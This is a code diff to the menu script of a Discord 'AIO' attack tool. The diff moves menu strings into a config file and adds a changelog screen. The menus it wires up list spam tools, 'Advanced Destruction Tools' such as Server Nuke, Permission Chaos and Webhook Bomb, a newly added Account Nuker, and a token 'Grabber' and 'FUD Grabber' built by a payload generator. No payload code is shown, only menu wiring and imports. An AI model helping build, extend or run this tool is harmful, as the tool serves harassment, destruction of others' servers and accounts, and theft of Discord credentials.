@@ -28,6 +28,23 @@ GITHUB_REPO = "SellMeFish/TTS-spammer"
 RAW_VERSION_URL = f"https://raw.githubusercontent.com/{GITHUB_REPO}/main/version.txt"
 LOCAL_VERSION_FILE = "version.txt"
 
+# Import strings configuration
+try:
+    from utils.config.strings_config import (
+        CHANGELOG, MENU_HEADERS, MENU_CHOICES,
+        PROMPTS, STATUS_MESSAGES, MESSAGES, UI_ELEMENTS, COLORS
+    )
+except ImportError:
+    # Fallback if config file is not available
+    CHANGELOG = ["v0.4.5 - Latest Update:", "✓ Configuration system added"]
+    MENU_HEADERS = {}
+    MENU_CHOICES = {}
+    PROMPTS = {}
+    STATUS_MESSAGES = {}
+    MESSAGES = {"success": {}, "error": {}, "info": {}}
+    UI_ELEMENTS = {}
+    COLORS = {}
+
 def get_local_version():
     if not os.path.exists(LOCAL_VERSION_FILE):
         return None
@@ -145,15 +162,19 @@ def show_status():
     color = rgb(0, 200, 255)
     print(color + center(f"Status: {status_message}") + RESET)
 
-def print_banner(show_webhook=False):
+def print_banner(show_webhook=False, show_changelog=False):
     os.system('cls' if os.name == 'nt' else 'clear')
+    
+    # Print banner first
     for idx, line in enumerate(BANNER):
         color = rgb(*RED_GRADIENT[idx % len(RED_GRADIENT)])
-        print(color + center(line) + RESET)
+        banner_line = color + center(line) + RESET
+        print(banner_line)
+    
     print()
-    print(rgb(255,0,64) + center("=" * shutil.get_terminal_size().columns) + RESET)
+    print(rgb(255,0,64) + center("=" * get_terminal_width()) + RESET)
     print(rgb(255,32,64) + center("Made by cyberseall") + RESET)
-    print(rgb(255,0,64) + center("=" * shutil.get_terminal_size().columns) + RESET)
+    print(rgb(255,0,64) + center("=" * get_terminal_width()) + RESET)
     print(rgb(255,64,64) + center("Discord AIO Tool 2025") + RESET)
     print(rgb(255,128,128) + center("Discord Server: https://discord.gg/ZgwVCdxH9Y | Discord/Dev: cyberseall") + RESET)
     print()
@@ -161,6 +182,11 @@ def print_banner(show_webhook=False):
     if show_webhook:
         print()
         show_webhook_box()
+    
+    # Show changelog as separate block if requested
+    if show_changelog:
+        print_changelog_block()
+    
     print()
 
 def pretty_print(text, color=(255,64,64), newline=True):
@@ -353,7 +379,9 @@ def theme_spam_menu():
     from utils.spamming.theme_spammer import spam_theme
     spam_theme(token, amount, interval, debug)
 
-def ask_token(prompt="Enter Discord Token: "):
+def ask_token(prompt=None):
+    if prompt is None:
+        prompt = PROMPTS.get("token", "Enter Discord Token: ")
     empty_count = 0
     while True:
         token = clean_singleline_input_left(prompt)
@@ -361,9 +389,11 @@ def ask_token(prompt="Enter Discord Token: "):
             return token
         empty_count += 1
         if empty_count >= 2:
-            pretty_print("No token entered twice. Returning to main menu...", (255,64,64))
+            pretty_print(MESSAGES.get("info", {}).get("no_token", "No token entered twice. Returning to main menu..."), 
+                        COLORS.get("error", (255,64,64)))
             return None
-        pretty_print("No token entered! Please try again or press Ctrl+C to cancel.", (255,64,64))
+        pretty_print(STATUS_MESSAGES.get("no_token", "No token entered! Please try again or press Ctrl+C to cancel."), 
+                    COLORS.get("error", (255,64,64)))
 
 def token_login_menu():
     while True:
@@ -571,11 +601,12 @@ def grabber_menu():
 
 def main_menu():
     while True:
-        print_banner(show_webhook=True)
+        print_banner(show_webhook=True, show_changelog=False)
+        
         questions = [
             inquirer.List('choice',
-                         message="Choose a category:",
-                         choices=[
+                         message=MENU_HEADERS.get("main", "Choose a category:"),
+                         choices=MENU_CHOICES.get("main", [
                              ' Spam Tools',
                              ' Discord Tools', 
                              ' Token Tools',
@@ -587,8 +618,9 @@ def main_menu():
                              ' Advanced Destruction Tools',
                              ' Grabber',
                              ' FUD Grabber',
+                             ' Changelog',
                              ' Exit'
-                         ]),
+                         ])),
         ]
         answers = inquirer.prompt(questions)
         if not answers or answers['choice'] == ' Exit':
@@ -618,14 +650,17 @@ def main_menu():
             grabber_menu()
         elif answers['choice'] == ' FUD Grabber':
             fud_grabber_menu()
+        elif answers['choice'] == ' Changelog':
+            changelog_menu()
 
 def spam_tools_menu():
     while True:
-        print_banner(show_webhook=True)
+        print_banner(show_webhook=True, show_changelog=False)
+        
         questions = [
             inquirer.List('choice',
-                         message="Spam Tools - Choose an option:",
-                         choices=[
+                         message=MENU_HEADERS.get("spam_tools", "Spam Tools - Choose an option:"),
+                         choices=MENU_CHOICES.get("spam_tools", [
                              'Discord Webhook Spammer',
                              'Theme Spammer',
                              'Ping Spam',
@@ -634,7 +669,7 @@ def spam_tools_menu():
                              'Friend Request Spam',
                              'Email Spam',
                              '← Back to main menu'
-                         ]),
+                         ])),
         ]
         answers = inquirer.prompt(questions)
         if not answers or answers['choice'] == '← Back to main menu':
@@ -672,11 +707,12 @@ def spam_tools_menu():
 
 def discord_tools_menu():
     while True:
-        print_banner(show_webhook=True)
+        print_banner(show_webhook=True, show_changelog=False)
+        
         questions = [
             inquirer.List('choice',
-                         message="Discord Tools - Choose an option:",
-                         choices=[
+                         message=MENU_HEADERS.get("discord_tools", "Discord Tools - Choose an option:"),
+                         choices=MENU_CHOICES.get("discord_tools", [
                              'Close All DMs',
                              'Unfriend All Friends', 
                              'DM All Friends',
@@ -688,7 +724,7 @@ def discord_tools_menu():
                              'User Lookup',
                              'Invite Resolver',
                              '← Back to main menu'
-                         ]),
+                         ])),
         ]
         answers = inquirer.prompt(questions)
         if not answers or answers['choice'] == '← Back to main menu':
@@ -970,11 +1006,12 @@ def non_discord_tools_menu():
 
 def advanced_destruction_menu():
     while True:
-        print_banner(show_webhook=True)
+        print_banner(show_webhook=True, show_changelog=False)
+        
         questions = [
             inquirer.List('choice',
-                         message="Advanced Destruction Tools - Choose an option:",
-                         choices=[
+                         message=MENU_HEADERS.get("advanced", "Advanced Destruction Tools - Choose an option:"),
+                         choices=MENU_CHOICES.get("advanced", [
                              ' Server Nuke',
                              ' Mass Ban/Kick Manager',
                              ' Permission Chaos',
@@ -982,7 +1019,7 @@ def advanced_destruction_menu():
                              ' Role Spam',
                              ' Webhook Bomb',
                              '← Back to main menu'
-                         ]),
+                         ])),
         ]
         answers = inquirer.prompt(questions)
         if not answers or answers['choice'] == '← Back to main menu':
@@ -991,6 +1028,9 @@ def advanced_destruction_menu():
         if answers['choice'] == ' Server Nuke':
             from utils.servers.server_nuke import run_server_nuke
             run_server_nuke()
+        elif answers['choice'] == ' Account Nuker':
+            from utils.advanced.account_nuker import run_account_nuker
+            run_account_nuker()
         elif answers['choice'] == ' Mass Ban/Kick Manager':
             from utils.spamming.mass_ban_kick import run_mass_ban_kick
             run_mass_ban_kick()
@@ -1027,6 +1067,52 @@ def fud_grabber_menu():
 
     from utils.grabbers.mini_payload_generator import run_mini_payload_generator
     run_mini_payload_generator()
+
+def changelog_menu():
+
+    print_banner(show_webhook=True)
+    pretty_print(" CHANGELOG", (255, 128, 0))
+    print_changelog_block()
+    
+    input(rgb(255,32,32) + "Press enter to go back to main menu..." + RESET)
+
+def get_changelog_text():
+    """Get formatted changelog text"""
+    version = get_local_version() or "Unknown"
+    changelog_lines = []
+    changelog_lines.append(f"📋 CHANGELOG - Version {version}")
+    changelog_lines.append("═" * 35)
+    changelog_lines.extend(CHANGELOG)
+    return changelog_lines
+
+def print_changelog_block():
+    """Print changelog as a left-aligned block like the main menu"""
+    changelog_lines = get_changelog_text()
+    print()
+    
+    for changelog_line in changelog_lines:
+        # Color the changelog line
+        if changelog_line.startswith("📋"):
+            colored_changelog = rgb(*COLORS.get("header", (255, 128, 0))) + changelog_line + RESET
+        elif changelog_line.startswith("═"):
+            colored_changelog = rgb(*COLORS.get("separator", (255, 64, 64))) + changelog_line + RESET
+        elif changelog_line.startswith("✓"):
+            colored_changelog = rgb(*COLORS.get("changelog_done", (0, 255, 128))) + changelog_line + RESET
+        elif changelog_line.startswith("•"):
+            colored_changelog = rgb(*COLORS.get("changelog_coming", (255, 255, 0))) + changelog_line + RESET
+        elif changelog_line.startswith("v"):
+            colored_changelog = rgb(*COLORS.get("version", (255, 128, 255))) + changelog_line + RESET
+        else:
+            colored_changelog = rgb(*COLORS.get("muted", (200, 200, 200))) + changelog_line + RESET
+        
+        # Print left-aligned instead of centered
+        print(colored_changelog)
+    
+    print()
+
+
+
+
 
 if __name__ == "__main__":
     try:
